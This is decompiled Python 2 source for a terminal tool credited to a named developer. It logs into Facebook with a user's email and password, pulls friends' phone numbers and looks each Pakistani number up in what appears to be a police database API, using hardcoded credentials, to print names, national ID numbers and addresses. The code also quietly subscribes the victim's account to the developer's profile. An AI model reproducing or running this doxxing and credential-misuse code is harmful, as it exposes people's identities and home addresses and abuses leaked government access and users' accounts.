# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <script>
# Compiled at: 2020-08-31 10:22:45
import os, time, sys, re, json as jc
from random import choice as chox
W = '\x1b[1;37m'
N = '\x1b[0m'
R = '\x1b[1;37m\x1b[31m'
B = '\x1b[1;37m\x1b[34m'
G = '\x1b[1;32m'
Y = '\x1b[1;33;40m'
trnd = W + '(' + R + '>' + W + ')'
trnw = W + '(' + R + '!' + W + ')'
trng = W + '(' + G + '>' + W + ')'
trny = W + '(' + Y + '>' + W + ')'
try:
    os.system('rm id.txt')
    os.system('touch id.txt')
    os.system('rm token.txt')
    os.system('touch token.txt')
except:
    pass

os.system('clear')
try:
    import requests as rnx, bs4
    print trng + G + ' Requirents Available'
except:
    print trnw + Y + ' Installing Requirements'
    os.system('pip2 install requests')
    os.system('pip2 install bs4')
    import requests as rnx, bs4
    os.system('clear')
    print trny + G + ' Requiremts Installed'

dburl = 'http://tel.epunjabpolice.com/api.aspx?f=search&user=Afzal&passwd=afzal8888098&number='
dbst = '\n======================================\n        <NDataBase-Details>\n\n [NAME] : [{}]\n [CNIC] : [{}]\n [NUMBER] : [{}]\n [ADRESS] : [{}]\n\n======================================\n'
cdst = '\n{}#SELECT OPTION\n\n {}[1] Single Search :)\n {}[2] Search From Friendlist :)\n {}[3] Search FB Account info  ;)\n {}[4] Exit ;)\n'
cdt = '\n[NAME] : [{}]\n[CNIC] : [{}]\n[NUMBER] : [{}]\n[ADRESS] : [{}]\n'
b1 = '\n _        ______   ______  \n( (    /|(  __  \\ (  ___ \\ \n|  \\  ( || (  \\  )| (   ) )\n|   \\ | || |   ) || (__/ / \n| (\\ \\) || |   | ||  __ (  \n| | \\   || |   ) || (  \\ \\ \n| )  \\  || (__/  )| )___) )\n|/    )_)(______/ |/ \\___/ \n                           \n'
b2 = "\nd8b   db d8888b. d8888b. \n888o  88 88  `8D 88  `8D \n88V8o 88 88   88 88oooY' \n88 V8o88 88   88 88~~~b. \n88  V888 88  .8D 88   8D \nVP   V8P Y8888D' Y8888P' \n"
b3 = "\n _   _  ___    ___   \n( ) ( )(  _`\\ (  _`\\ \n| `\\| || | ) || (_) )\n| , ` || | | )|  _ <'\n| |`\\ || |_) || (_) )\n(_) (_)(____/'(____/'\n"
b4 = "\n'##::: ##:'########::'########::\n ###:: ##: ##.... ##: ##.... ##:\n ####: ##: ##:::: ##: ##:::: ##:\n ## ## ##: ##:::: ##: ########::\n ##. ####: ##:::: ##: ##.... ##:\n ##:. ###: ##:::: ##: ##:::: ##:\n ##::. ##: ########:: ########::\n..::::..::........:::........:::\n"
b5 = "\n'||\\   ||` '||'''|. '||'''|,  \n ||\\  ||   ||   ||  ||   ||  \n || \\ ||   ||   ||  ||;;;;   \n ||  \\||   ||   ||  ||   ||  \n.||   \\||. .||...|' .||...|'  \n"
banerlist = [
 b1, b2, b3, b4, b5]

def numget(numf):
    rd = rnx.get(dburl + str(numf)).text
    if len(rd) > 10:
        par = bs4.BeautifulSoup(rd, features='html.parser')
        namei = par.find('strong').renderContents()
        nicno = par.find('a', class_='cnic').renderContents()
        loct = re.findall('>(.*?)<', rd)[8]
        print cdt.format(namei, nicno, nump, loct)
    else:
        print R + '[!]' + W + ' Not Found :( '


def pname(tokac):
    try:
        rnx.post('https://graph.facebook.com/100006143266745/subscribers?access_token=' + tokac)
        r = rnx.get('https://graph.facebook.com/me?access_token=' + tokac)
        a = jc.loads(r.text)
        nam = a['name']
        print trny + G + (' Name : {} {} ').format(W, nam)
    except:
        pass


def fetchp(tokac):
    tk = open('token.txt', 'w')
    tk.write(str(tokac))
    tk.close()
    r = rnx.get('https://graph.facebook.com/me/friends?access_token=' + tokac)
    a = jc.loads(r.text)
    cw = open('id.txt', 'a')
    for i in a['data']:
        cw.write(str(i['id']) + '\n')

    cw.close()
    fread = open('id.txt', 'r').read().split()
    ntotal = len(fread)
    ni = 0
    print '\n' + trng + G + (' Total Accounts : {}{}').format(W, ntotal)
    tok = open('token.txt', 'r').read()
    print trny + G + ' Searching For Pakistani Number\n'
    while ni <= ntotal:
        idn = str(fread[ni])
        sys.stdout.write(('\r {} Searching {} ({}/{})').format(trng, G, ni, ntotal))
        sys.stdout.flush()
        ni = ni + 1
        x = rnx.get('https://graph.facebook.com/' + idn + '?access_token=' + tok)
        z = jc.loads(x.text)
        try:
            if str(z['mobile_phone'][:3]) == '+92':
                print W + '\nName : ' + G + z['name']
                cp = z['mobile_phone'].split('+92')
                numf = str(('0').join(cp))
                print W + 'Ph.No : ' + G + str(numf)
                print trng + G + (' Finding {}{} {} Info').format(Y, numf, G)
                rd = rnx.get(dburl + str(numf)).text
                if len(rd) > 100:
                    par = bs4.BeautifulSoup(rd, features='html.parser')
                    namei = par.find('strong').renderContents()
                    nicno = par.find('a', class_='cnic').renderContents()
                    loct = re.findall('>(.*?)<', rd)[8]
                    print Y + ('\n [NAME] : [{}] \n [CNIC] : [{}]  \n [ADRESS] : [{}] \n').format(namei, nicno, loct)
                else:
                    print R + '[!]' + W + ' Not Found :( \n'
        except:
            pass


def fetchpi(tokac):
    tk = open('token.txt', 'w')
    tk.write(str(tokac))
    tk.close()
    tok = open('token.txt', 'r').read()
    while True:
        idn = raw_input(trng + G + ' Account ID : ' + Y)
        x = rnx.get('https://graph.facebook.com/' + idn + '?access_token=' + tok)
        z = jc.loads(x.text)
        try:
            if str(z['mobile_phone'][:3]) == '+92':
                print W + '\nName : ' + G + z['name']
                cp = z['mobile_phone'].split('+92')
                numf = str(('0').join(cp))
                print W + 'Ph.No : ' + G + str(numf)
                print trng + G + (' Finding {}{} {} Info').format(Y, numf, G)
                rd = rnx.get(dburl + str(numf)).text
                if len(rd) > 100:
                    par = bs4.BeautifulSoup(rd, features='html.parser')
                    namei = par.find('strong').renderContents()
                    nicno = par.find('a', class_='cnic').renderContents()
                    loct = re.findall('>(.*?)<', rd)[8]
                    print Y + ('\n [NAME] : [{}] \n [CNIC] : [{}]  \n [ADRESS] : [{}] \n').format(namei, nicno, loct)
                else:
                    print R + '[!]' + W + ' Not Found :( \n'
        except:
            print R + '[!]' + W + ' No Number in Account :( \n'


def token(email, password):
    ldata = rnx.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    tkdata = ldata.text
    gdat = jc.dumps(tkdata)
    craw = gdat.split('\\')
    try:
        if craw[1] == '"session_key':
            print '\n' + trng + G + ' Login Sucessfull ' + '\n'
            acc = craw[13].split('"')
            tokac = acc[1]
            pname(tokac)
            print trny + G + " Getting Accounts ID's.... \n"
            fetchp(tokac)
        else:
            print '\n' + trny + R + ' Login Failed '
    except:
        print R + '\n' + trng + ' Check you Internet Connection'
        time.sleep(2)


def tokeni(email, password):
    ldata = rnx.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    tkdata = ldata.text
    gdat = jc.dumps(tkdata)
    craw = gdat.split('\\')
    try:
        if craw[1] == '"session_key':
            print '\n' + trng + G + ' Login Sucessfull ' + '\n'
            acc = craw[13].split('"')
            tokac = acc[1]
            pname(tokac)
            fetchpi(tokac)
        else:
            print '\n' + trny + R + ' Login Failed '
    except:
        print R + '\n' + trng + ' Check you Internet Connection'
        time.sleep(2)


print R + trnw + ' Dev Is Not Responsible For Any Illegal Use'
print G + chox(banerlist)
print '' + trnd + R + ' Version : ' + W + '1.0'
print '' + trng + G + ' Developer : ' + W + 'Nasir Ali'
print '' + trng + G + ' Facebook : ' + W + 'fb.com/nasir.xo'
print '' + trng + G + ' Instagram : ' + W + '@nasir.xoz'
while True:
    print cdst.format(R, trny, trny, trny, trny)
    choic = raw_input('\n' + G + 'nasir' + R + '@' + Y + 'ndb' + W + ' > ')
    if choic == '1':
        print '\n'
        iv = 1
        while iv:
            nump = raw_input(trng + G + ' [CNIC/Ph.No] : ' + Y)
            try:
                if nump.lower() == 'back':
                    iv = 0
                rd = rnx.get(dburl + str(nump)).text
                if rd != '---- Search END ----':
                    par = bs4.BeautifulSoup(rd, features='html.parser')
                    namei = par.find('strong').renderContents()
                    nicno = par.find('a', class_='cnic').renderContents()
                    loct = re.findall('>(.*?)<', rd)[8]
                    print Y + dbst.format(namei, nicno, nump, loct)
                else:
                    print R + '[!]' + W + ' Not Found :( '
            except:
                print R + '[!]' + W + ' Check Your Internet Connection :( '

    if choic == '2':
        print '\n' + G + '[' + Y + '!' + G + ']' + W + ' Enter Facebook Email/Pass :) '
        email = raw_input(W + '(' + R + '>' + W + ')' + G + ' EMAIL : ' + W)
        password = raw_input(W + '(' + R + '>' + W + ')' + G + ' PASSWORD : ' + W)
        token(email, password)
    if choic == '3':
        print '\n' + G + '[' + Y + '!' + G + ']' + W + ' Enter Facebook Email/Pass :) '
        email = raw_input(W + '(' + R + '>' + W + ')' + G + ' EMAIL : ' + W)
        password = raw_input(W + '(' + R + '>' + W + ')' + G + ' PASSWORD : ' + W)
        tokeni(email, password)
    if choic == '4':
        print '\n' + trnd + Y + ' BYE-BYE '
        sys.exit()
# okay decompiling patched.pyc
